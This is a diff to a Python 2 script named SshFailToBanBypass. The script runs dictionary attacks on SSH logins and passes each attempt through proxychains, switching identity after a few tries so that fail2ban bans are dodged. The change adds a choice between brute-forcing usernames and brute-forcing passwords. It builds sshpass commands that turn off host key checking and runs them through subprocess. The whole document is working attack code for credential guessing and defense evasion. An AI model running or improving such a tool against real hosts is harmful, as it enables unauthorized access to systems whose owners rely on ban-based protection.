@@ -67,9 +67,10 @@ def argvcontrol():
 		if t:
 			manage_dependences()
 
-	parser = argparse.ArgumentParser(epilog="Ex: sudo ./SshFailToBanBypass.py wordlist.txt -i 127.0.0.1 -p 22 -a 3 -u root")
+	parser = argparse.ArgumentParser(epilog="Ex: sudo ./SshFailToBanBypass.py wordlist.txt -i 127.0.0.1 -p 22 -a 3 -b pass -c root")
 	parser.add_argument("wordlist", help="Wordlist for dictionary attack")
-	parser.add_argument("-u","--user", help="User used to connection", default="root")
+	parser.add_argument("-b","--bruteforce", help="The bruteforce attack type (user, pass)", default="pass")
+	parser.add_argument("-c","--credential", help="Constant credential (user, pass) value depending on the bruteforce attack type", default="root")
 	parser.add_argument("-i","--ip", help="Destination ip address", default="127.0.0.1")
 	parser.add_argument("-p","--port", help="Destination port", default="22")
 	parser.add_argument("-a","--attempts", help="Number of attempts before identity change", default="3")
@@ -77,10 +78,16 @@ def argvcontrol():
 	parser.add_argument("-t","--test", help="Use the to test dependences", action='store_true', default=False)
 	args = parser.parse_args()
 
-   	valid = True
-	if not userValidator(args.user):
-		print "[!] Invalid User format"
-		valid = False
+	valid = True
+	if args.bruteforce == "user":
+		if not userValidator(args.credential):
+			print "[!] Invalid User format"
+			valid = False
+	elif args.bruteforce == "pass":
+		pass
+	else:
+		print "[!] Invalid bruteforce type, choose between: user, pass"
+		exit()
 	if not ipValidator(args.ip):
 		print "[!] Invalid Ip Address"
 		valid = False
@@ -110,12 +117,19 @@ def main():
 
 			image()
 
-			user = check[1].user
+			bruteforce = check[1].bruteforce
 			ip = check[1].ip
 			port = check[1].port
 			wordlist = check[1].wordlist
 			attempts = int(check[1].attempts)
 			wait = int(check[1].wait)
+			user = ""
+			password = ""
+
+			if bruteforce == "user":
+				password = check[1].credential
+			elif bruteforce == "pass":
+				user = user = check[1].credential
 			
 			f = open(wordlist)
 			c = 0
@@ -137,8 +151,13 @@ def main():
 					print
 
 				print 'We\' re trying with: ' + line
-				var = 'proxychains sshpass -p ' + line[:-1] + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
+				if bruteforce == "user":
+					user =  line[:-1]
+				elif bruteforce == "pass":
+					password = line[:-1]
+				var = 'proxychains sshpass -p ' + password + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
 				var_list = var.split(' ')
+				print '[*] ' + var
 				subprocess.call(var_list)
 				c += 1
 
